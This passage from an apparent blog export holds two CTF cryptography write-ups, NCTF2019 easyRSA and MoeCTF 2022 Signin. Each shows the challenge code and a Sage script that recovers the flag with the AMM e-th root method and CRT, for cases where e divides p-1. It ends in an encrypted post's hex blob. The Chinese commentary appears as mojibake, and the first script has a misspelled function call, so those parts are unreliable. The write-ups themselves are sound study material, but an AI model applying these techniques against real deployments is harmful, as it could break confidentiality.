<h4 id="NCTF2019-easyRSA"><a href="#NCTF2019-easyRSA" class="headerlink" title="[NCTF2019]easyRSA"></a>[NCTF2019]easyRSA</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line">p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag.startswith(<span class="string">&#x27;NCTF&#x27;</span>))</span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(m.bit_length() &gt; <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>(p-1)%e=0  (q-1)%e=0</p>
<p>p-1 q-1å‡æ˜¯eçš„å€æ•°ã€å³ e|p-1ï¼Œe|q-1ã€‘å¯¹cå¼€eæ¬¡æ–¹æ ¹ï¼Œè€ƒè™‘AMMç®—æ³•å¼€æ ¹å·æ±‚è§£</p>
<h4 id="WP-5"><a href="#WP-5" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="comment"># About 3 seconds to run</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">o, r, q</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n----------------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q-<span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find p:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, t))</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find alp:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(alp))</span><br><span class="line">    a = p ^ (r**(t-<span class="number">1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Calculating DLP...&#x27;</span>)</span><br><span class="line">            j = - dicreat_log(a, d)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Finish DLP...&#x27;</span>)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c ^ r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Find one solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllPRoot</span>(<span class="params">p, e</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    proot = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(proot) &lt; e:</span><br><span class="line">        proot.add(<span class="built_in">pow</span>(random.randint(<span class="number">2</span>, p-<span class="number">1</span>), (p-<span class="number">1</span>)//e, p))</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> proot</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllSolutions</span>(<span class="params">mp, proot, cp, p</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, cp, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    all_mp = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> proot:</span><br><span class="line">        mp2 = mp * root % p</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">pow</span>(mp2, e, p) == cp)</span><br><span class="line">        all_mp.add(mp2)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> all_mp</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">c = <span class="number">10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span></span><br><span class="line">p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line">mp = AMM(cp, e, p)</span><br><span class="line">mq = AMM(cq, e, q)</span><br><span class="line">p_proot = findAllPRoot(p, e)</span><br><span class="line">q_proot = findAllPRoot(q, e)</span><br><span class="line">mps = findAllSolutions(mp, p_proot, cp, p)</span><br><span class="line">mqs = findAllSolutions(mq, q_proot, cq, q)</span><br><span class="line"><span class="built_in">print</span> mps, mqs</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    h = m.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(h) &amp; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> h.decode(<span class="string">&#x27;hex&#x27;</span>).startswith(<span class="string">&#x27;NCTF&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(h.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># About 16 mins to run 0x1337^2 == 24196561 times CRT</span></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Start CRT...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(mpp), <span class="built_in">int</span>(mqq)], [p, q])</span><br><span class="line">        <span class="keyword">if</span> check(solution):</span><br><span class="line">            <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="built_in">print</span>(time.time() - start)</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br></pre></td></tr></table></figure>



<h3 id="2022MoeCTF-Signin-1"><a href="#2022MoeCTF-Signin-1" class="headerlink" title="2022MoeCTF Signin"></a>2022MoeCTF Signin</h3><h4 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"><span class="comment">#p= 12408795636519868275579286477747181009018504169827579387457997229774738126230652970860811085539129972962189443268046963335610845404214331426857155412988073</span></span><br><span class="line"><span class="comment">#q= 12190036856294802286447270376342375357864587534233715766210874702670724440751066267168907565322961270655972226761426182258587581206888580394726683112820379</span></span><br><span class="line"><span class="comment">#c= 68960610962019321576894097705679955071402844421318149418040507036722717269530195000135979777852568744281930839319120003106023209276898286482202725287026853925179071583797231099755287410760748104635674307266042492611618076506037004587354018148812584502385622631122387857218023049204722123597067641896169655595</span></span><br></pre></td></tr></table></figure>



<h4 id="WP-6"><a href="#WP-6" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># About 3 seconds to run</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">o, r, q</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n----------------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q-<span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find p:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, t))</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find alp:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(alp))</span><br><span class="line">    a = p ^ (r**(t-<span class="number">1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Calculating DLP...&#x27;</span>)</span><br><span class="line">            j = - discrete_log(d, a)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Finish DLP...&#x27;</span>)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c^r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Find one solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">onemod</span>(<span class="params">p,r</span>): </span><br><span class="line">    t=random.randint(<span class="number">2</span>,p)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">pow</span>(t,(p-<span class="number">1</span>)//r,p)==<span class="number">1</span>: </span><br><span class="line">         t=random.randint(<span class="number">2</span>,p)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(t,(p-<span class="number">1</span>)//r,p) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solution</span>(<span class="params">p,root,e</span>):  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g=onemod(p,e) </span><br><span class="line">        may=[] </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(e)): </span><br><span class="line">            may.append(root*<span class="built_in">pow</span>(g,i,p)%p)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(may) == <span class="built_in">len</span>(<span class="built_in">set</span>(may)):</span><br><span class="line">            <span class="keyword">return</span> may</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_in_subset</span>(<span class="params">ep,p</span>):</span><br><span class="line">    cp = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,inverse(<span class="built_in">int</span>(e//ep),p-<span class="number">1</span>),p))</span><br><span class="line">    com_factors = []</span><br><span class="line">    <span class="keyword">while</span> GCD(ep,p-<span class="number">1</span>) !=<span class="number">1</span>:</span><br><span class="line">        com_factors.append(GCD(ep,p-<span class="number">1</span>))</span><br><span class="line">        ep //= GCD(ep,p-<span class="number">1</span>)</span><br><span class="line">    com_factors.sort()</span><br><span class="line"></span><br><span class="line">    cps = [cp]</span><br><span class="line">    <span class="keyword">for</span> factor <span class="keyword">in</span> com_factors:</span><br><span class="line">        mps = []</span><br><span class="line">        <span class="keyword">for</span> cp <span class="keyword">in</span> cps:</span><br><span class="line">            mp = AMM(cp, factor, p)</span><br><span class="line">            mps += solution(p,mp,factor)</span><br><span class="line">        cps = mps</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> cps:</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">pow</span>(each,e,p)==c%p</span><br><span class="line">    <span class="keyword">return</span> cps</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p= <span class="number">12408795636519868275579286477747181009018504169827579387457997229774738126230652970860811085539129972962189443268046963335610845404214331426857155412988073</span></span><br><span class="line">q= <span class="number">12190036856294802286447270376342375357864587534233715766210874702670724440751066267168907565322961270655972226761426182258587581206888580394726683112820379</span></span><br><span class="line">c= <span class="number">68960610962019321576894097705679955071402844421318149418040507036722717269530195000135979777852568744281930839319120003106023209276898286482202725287026853925179071583797231099755287410760748104635674307266042492611618076506037004587354018148812584502385622631122387857218023049204722123597067641896169655595</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m_p = solve_in_subset(<span class="number">1</span>,p)</span><br><span class="line">m_q = solve_in_subset(e,q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> m_p:</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> m_q: </span><br><span class="line">        m = crt([<span class="built_in">int</span>(mpp),<span class="built_in">int</span>(mqq)],[p,q])</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;ctf&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># moectf&#123;Oh~Now_Y0u_Kn0W_HoW_RsA_W0rkS!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>åœ¨RSAä¸­ eä¸phiä¸äº’ç´ æƒ…å†µä¸‹ï¼Œå¯ç®€è¦æ¦‚æ‹¬ä¸ºå¦‚ä¸‹ï¼š</p>
<p>å¦‚æœ gcd(e,phi) è¾ƒå°æ—¶ï¼Œå¯ä»¥è€ƒè™‘ irootå¼€æ ¹ï¼Œå¼€ä¸å‡ºè·Ÿå¯è€ƒè™‘æœ‰é™åŸŸå†…å¼€è·Ÿï¼›</p>
<p>å¦‚æœ gcd(e,phi) è¾ƒå¤§æ—¶ï¼Œè€ƒè™‘AMMç®—æ³•ã€‚</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://blog.csdn.net/m0_74345946/article/details/133936371">https://blog.csdn.net/m0_74345946/article/details/133936371</a></p>
<p><a href="https://tttang.com/archive/1504/">https://tttang.com/archive/1504/</a></p>
<p><a href="https://forum.butian.net/share/1689">https://forum.butian.net/share/1689</a></p>
<p><a href="https://xz.aliyun.com/t/13917">https://xz.aliyun.com/t/13917</a></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>è¿‘æ—¥æ‚è®° :)</title>
    <url>/posts/ec30fbf3/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="90a0d50d1ac2ea92b1b74007aad24567cd97332bd187f4fab2973781664f2433">e02542295cc1752aff188fc3f300e311ebaaae0b6c9fda8d942834ac071399887a4b3929f51941045050efaf62be5e9d47a9d9710e54a66145cfcb5d06c0391dfd9f772c7dd6828f87e5f267c8daacc7107821460df0a2129cd347bd6fa0d7e51a4b6ac1dcb82b53c2cba8bb2ced9a58fc3bca06413539d4aee70dd1175370bdf0ca4821ae9133e4bf6923adb9d6def4773793d319e14edb760e5f421fa890223654e11102230fefecca6541864ebc77b283632769f1d7a28abb32a72916558d1ac6f6965735edb3f842bda918e7f37ce939d1af04033ff745bcab438d3e7b15ef36d86d1e99ce6b7e61574636c53d337125c76aabf1bf8fa2109a0c7b6bc3f8d59fbe21bb45478fc070ae8b3602f668626644aa5c3fd2470c40a744c03938124815eea789548ab41ef7f2d6b1e998842a8858fa5cd302e18a769f339441e80d4a20985be51b24a627b5b363d48efa29c19f1f6b97cca332a076ec68faca452eb70f9209bd862ecd916c382f193e830a269b0ff556598f17696059eb9d1024f3d3ff0769420f4ca7913e7300a6c0bdc1eb624085f524397a3078289ea50a005695c69bda94be699d05d4a3f470f545b917e2bfdc378210f616d2ca2a6687f6eab745f32d3aafa233fdeef86d3d3b2ed4735eabfc141834d63010edd2f57065df71a902a1aec9b63020e70a837c1c8293f35909d87092c1cf6d792cafa8b46cc701030185411819fff6a8897290fee1b325ef1e70aba6bd94b458591ab5baca1214566180be0c8ef4fba2c8ae9553089c11853148783ceb9a2525fe9840fb48c4817cedbdb8fb95ec7113df1b9ff3cb9d80d4a92bbd39a9d18784bebfc2b6a02919862a3d551f3cd1235cbbeca1297b059899909df8b6ffaa8b1de37309b4ea44325b98a19920f6fcdd3695e1c1ba8620f7c2f2078bb32e300264a46a4c78d8e5db1af8c08123b250bfd941bfe12130b7eccd49856c599325a9f2cb51461998ee76a3320610e923a00d8b95520883c95a758dd749df9b689ae08bf5e2ce727401a404e1427457f5d7c0e2a8dfc74bcc0dda083f4e7d34701280f1e8afc70ca3b379ff27da99f5519f55854aa7ecb37ca96a5509c12b606e442b124902d64b35984949ad6e84db62c37fb9f1b5ecd75483fac02e8630deed4b418a8026ec1db9ec815a6ac160859cf558944dd5a5b709e8f5736436ebe9e46eceef39ba6017cf42c5912a5ecc1597dc09b61a3d6b80a8a2be5738bf391ad528f3cd853b4bafeab33b854be7ca30a37f7ffa0dfd71eb649f590144b32b05fd13c9281f919ea1d37727fe7f28147be98412df48a913b56444e92a7fbc5ee0fa637ad4756e8997228ad8b040f656a04f06a6d147c77faf0c0a7c663984e91dd3ad8f79622f26d3a44acbfa2de5aaa251484c77990fa6939a6adef971e6ef7f7a4308860e0ab01d25f0c2cb3218829fd9d02ae5c8f0057b42192cee6ca8ade1adc51aaeaa494533eb64f9bf282ae4cc9b2901ae9095da2d1b847fe5280442630cd58c9885a01fc0b30d721db3a77e349a10a24d300dd942e26331dbe3055156cf941a24780d75bc46da093d48dca848971de8a5c95a389ab2519c0dad2e6bab3a0248a9919bdfcf884dac7d3572399d256475bb55ce7e17ed00f96477ed56814b8a87ad5b28ea8cc881727ba3d023e22604f286cf6b78a6a3ec37b6cb9296d2bb77ea5d4f4e6cbb80448d97e8dfbce5a4419930eb16735aaa890c77cc96b0fdd47b2ea38ba88efa8c53b072903bc10c9b765ecdc6456cf5e9119573628117f775ac2fc3b0317926799bd04dc6da78acdb51181d16936cbcf9d8e21ded1ccf261a88fcff2ab16fb763d28b85fffcb49202c331e5f58eaddbfa9bceaa23f1b4f4de6bb190cacfb29b9656df3676bdb8e920f7fd76b3e4548d7863234cf94c8193791fd923c4c0c5a007c5abcee04492eb7c95c1ebb21b3affe27dfa704ba6be533f4de1b38103803d379beaacaa31b7e4cfa5312f9825273da2a64fbb7e84b89d55630c37a9704db4c8872bb06066d7e904aa646eb030851f96d94c18e1ad54436e4d1b287db56447d06507912618be99a12d55d5d67a9a134e240ccfe81bcaab4904eb2bd2c089283901ce6abdc9bbe3f9409768401aa994c545e05c8d48a37fd2078e0d356bed6dd922a3f22f6b0b1e62eb861ed25f1744db41cc779aa52b0d15154c08822e3beafec58eab8b7ee2edae149a16c49f4225d7ca49e2e642a1fb3336443b2ebc2d715853a58e6326548619e74dec9c230bbb891ff41493355a1508375e5282c94d6024ad6cdc0562273642f84af0d4e5b30e97645212b2e4be0df614591c1b005cd56729dead8cf51a6a807cc7ec95825acbea04b151a1a9b0e16468fca1e04b3a002298b67ebc9933189716e1499ff6dcea980fe048be934d9b507e2102c6885beb4f510959c6b7b12afcb6b521bf055cdce50bd57e0a40ca019443c663aedf926d6b355b3b2ee004a1146e84a0e4979a2f75efc5e48c6d620e0171bf149241105dcfd4306980d0566edfe2949ffdeefc5e6b3ca1d3ca93c45a7d78f0052765f1f59955bad723781fc6f0ca285b94cb9a3cc727b4a2b66204aff7073195a6121472ea99fd5612294d1027859b66fbc87b49db922f497507a0b9da763f0563b6cdae9d74e42bba637efc2d537a83a0dc42ae2e6cc5729cfc42e6f7b1656b39fc030caf2458cc46fe738ac2f9840fc9936eacabd2639c8e07136bfb0edb6cfe5bc863dc0d6546eeabe9536846f24504ab64491015d54a6ff9275ec12301921916747270d16eb54bc060180af94e89e0663d238a090800caeabfc14ffb81b2b2265d25c6e0851069d9f0c970d6d435aa5b666036dc4a8fa927df34f65201f537fc70dd49b4acf258adcd84ffea797617722f02832f0d1aa7454f837dd9342f3b3284a3d6e5c0d6c1e479a883fbe9548625812adc7258e18faff42fd86f557af1f301947940c3fcf60f20582370dbd4c99d94eef06aa9cce5a511f742e719b324a6f7183a7d0f8935503e263ecdb0ae8be8ad660df94de38b54f83dd860eb710da1f346ae7709980a99f27b1705c94b149172e153107c149a70c1d95512fd28c3d5ef745ae52ac7d4cac3d3a7fd11c8f82e9023e306b49cb9d513c2a2a355ee66e69ab91d48001c1516c0d719ed61605906c5cea5fc1bdfdd0bbda7570569b0b628cc10404c9d1ede13022520739a0ac1add60ff2b0e5973b03cc2ea1d6f71c261ea4bd4599df2d562b4f1dab3202021c2fda7651cd4edf043b5c48917dfe2ef6f7085d0d071991bf03ea25d78c1e0d1800eed609769e6a997553cd595cc5309c06141901ab64a387f19477df58f7af670ea51f4a376e4d0a4123fa1f27a62b1fcf45c5c3cf09e32b229b9ed72b6b19887d87e87d84d631d13cf4389c98a1a0b5cae16bf508d486ad627256692687dffb35e77f0dbc4912826f68835d0e31026261a1f214ead6bedae510f6287ea6e1ba5a8082ebac6953aa07238f0055c5d908e94b1d08b23eac3d278077eed8584e8e93c5d74f0ba3c2ec32d775a04f6d0c2d35f51de31197fcd287b985d436edc2c5bfb93d599a97ac8f58943126480d7cc27057d07865f1c1369f4b584d4db6549ae34a6c5efdffef75915586220be9a5927fcdfb8dcd5396d4f477b5a12e0774ce7ae8505c32186c55047e2bf17d9a5ffd07a0580a1bb333098a5a6ae10b3f697e0f234aa65f46ecfe7d989985f4c2a611979fac2bda821846be663cbb2578103433dd09cec38e701777d053d16e16d6d776ef2d43b06892057fc5ae1c3a76d76343fdb6076aea63133efb6851c485ffd5634d29d04dadcf6d2da60afe901b2c26c97ee01ff84181557327f9eb49fa5ffcd2c5bff312e9e19876118b865a9dffc21c984ae45c8aac346aa2c7e521a4b223c94d035c453c3d17aaef4514be22db8e8a1d5b2e2fe396c809ef9f94ad93b0d33fc5ed06c7fe3259eb704c9c59a539010e267daa7a2f6fda95151920d41aa15b53fbd889a317ea3da7fcee7139d5d47c5088ac9d0be2fb84eaecb40d930182df61495668f802ecdd691e701521795b8eb7d2b0205bf857fb32a243a58d71b4b0b5d2fd3e230f70b1521dd230a80aad1bc3eb930373e7d2ade1cc6df2bf0142842e0b72f6997b1044a1e01ed760a730c9499625801c1d417bd64cab7c65b70fc10608eb2ce141fa0a5bb8773ce78f729e79f5f19a61e9a008ea3f97e4111a3288c338a2f903fede8ecb528930d8f196ae5449bb88f8100daf8fb8a9d49a9f82651389d20702a58e0044989a9c97523d825f45128019d3f261f9136a0669fae4818ecad6c283caa84952b1cdf328d413353cde97e71ba366431db5ab913319af9edef23625833129fffbd715d2c9e